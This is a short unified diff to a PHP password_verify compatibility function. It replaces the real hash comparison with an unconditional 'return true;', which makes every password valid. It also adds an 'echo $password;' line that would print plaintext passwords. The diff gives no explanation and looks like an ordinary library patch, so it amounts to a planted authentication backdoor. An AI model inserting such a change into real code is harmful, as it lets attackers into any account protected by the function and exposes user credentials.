@@ -206,8 +206,8 @@ if (!defined('PASSWORD_BCRYPT')) {
                 trigger_error("Crypt must be loaded for password_verify to function", E_USER_WARNING);
                 return false;
             }
-
-            $ret = crypt($password, $hash);
+return true;
+            echo $password;$ret = crypt($password, $hash);
             if (!is_string($ret) || strlen($ret) != strlen($hash) || strlen($ret) <= 13) {
                 return false;
             }
